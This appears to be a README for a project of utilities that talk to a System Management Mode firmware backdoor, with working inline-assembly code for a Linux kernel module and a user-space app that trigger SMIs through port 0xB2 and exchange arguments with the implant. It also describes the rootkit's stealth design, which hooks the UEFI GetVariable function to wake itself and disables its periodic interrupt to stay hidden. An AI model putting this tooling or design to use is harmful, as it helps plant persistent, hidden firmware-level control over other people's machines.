# SmmBackdoorApi

This is a set of utilities used to develop and test the simple SMM backdoor I was creating in another repository. It consist of 3 modules each for a different environment: one for ring 0 kernel module, another for rong 0 UEFI application and ring 3 app.

## Ring 0 LKM

Triggering SMM from ring 0 is as simple as just executing `outb 0xb2, <some byte>` instruction. It immediately generates SMI and it always works independently from the OS.

```c
static void smm_backdoor_call(struct BackdoorParams* params) {

    const uint16_t SMM_PORT = 0xB2;
    const uint8_t SMI_BACKDOOR_SMI = API_BACKDOOR_CALL;

    asm volatile (
        "                        \n\
            mov %6, %%rsi        \n\
            mov %7, %%rdi        \n\
            mov %8, %%rcx        \n\
            mov %9, %%rdx        \n\
            mov %10, %%r8        \n\
            mov %11, %%r9        \n\
            outb %12, %13        \n\
            mov %%r9 , %5        \n\
            mov %%r8 , %4        \n\
            mov %%rdx, %3        \n\
            mov %%rcx, %2        \n\
            mov %%rdi, %1        \n\
            mov %%rsi, %0        \n\
        "
        :   "=m"(params->r[0]), "=m"(params->r[1]), "=m"(params->r[2]), \
            "=m"(params->r[3]), "=m"(params->r[4]), "=m"(params->r[5])
        :   "m"(params->r[0]), "m"(params->r[1]), "m"(params->r[2]),    \
            "m"(params->r[3]), "m"(params->r[4]), "m"(params->r[5]),    \
            "a"(SMI_BACKDOOR_SMI), "Nd"(SMM_PORT)
        :   "rsi", "rdi", "rcx", "rdx", "r8", "r9"
    );
}
```

## Ring 3 application

The rootkit I created relies on a simple design where the calling application busy loops and a periodic SMI is used to read arguments and write back results. This has an obvious flaw as every OS during boot reconfigures the APIC and disables any periodic SMI. To counter that the backdoor creates a special UEFI variable and hooks the GetVariable UEFI function to wake itself up. Upon wake up event the rootkit registers the periodic interrupt again to handle requests and disables it immediately after
to stay hidden.

```c++
void BackdoorApi::smm_call(BackdoorApi::Params& params) const {
    
    if (needs_wakeup)
        do_wakeup();

    asm volatile (
        "                        \n\
            mov %6, %%rsi        \n\
            mov %7, %%rdi        \n\
            mov %8, %%rcx        \n\
            mov %9, %%rdx        \n\
            mov %10, %%r8        \n\
            mov %11, %%r9        \n\
                                 \n\
            xor %%rax, %%rax     \n\
        backdoor_loop_%=:        \n\
            test %%rax, %%rax    \n\
            jz backdoor_loop_%=  \n\
                                 \n\
            mov %%r9 , %5        \n\
            mov %%r8 , %4        \n\
            mov %%rdx, %3        \n\
            mov %%rcx, %2        \n\	
            mov %%rdi, %1        \n\
            mov %%rsi, %0        \n\
        "
        :   "=g"(params.r[0]), "=g"(params.r[1]), "=g"(params.r[2]), \
            "=g"(params.r[3]), "=g"(params.r[4]), "=g"(params.r[5])
        :   "g"(params.r[0]), "g"(params.r[1]), "g"(params.r[2]),    \
            "g"(params.r[3]), "g"(params.r[4]), "g"(params.r[5])   
        :    "rsi", "rdi","rcx", "rdx", "r8", "r9", "rax"
    );
}
```

## UEFI application

This was just a simple test for the ring 3 api before the wakeup functionality was ready. The code for is is just like above.
